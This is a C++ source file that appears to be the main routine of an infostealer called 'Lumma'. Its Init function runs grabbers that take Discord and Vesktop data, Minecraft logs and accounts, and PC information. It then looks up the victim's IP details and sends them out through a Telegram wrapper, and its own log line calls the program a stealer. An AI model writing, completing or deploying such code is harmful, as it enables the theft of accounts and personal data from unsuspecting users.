#include "pch.h"

#include "config/telegram.h"
#include "utils.h"
#include "debug.h"

#include "grabbers/getinfopc.h"
#include "grabbers/minecraft.h"
#include "grabbers/discord.h"
#include "grabbers/minecraftacc.h"

#include "wrappers/curl.h"
#include "wrappers/telegram.h"

#include <iostream>
#include <thread>

/*
some code is copy and pasted from junipermatcha
*/

namespace Lumma {
    void Init() {
        //Debug::Initialize();

        grab::GetDiscordFolder();
        grab::GetVesktop();
        grab::getMinecraftLogs();
        grab::stealMinecraft();
        grab::GetPCInfo();

        curl::HttpResponse res = curl::Get("https://ipinfo.io/json");

        telegram::SendMessageT(res.body);

        Debug::LogWarn("Stealer can be shut off now.");
        return;
    }
}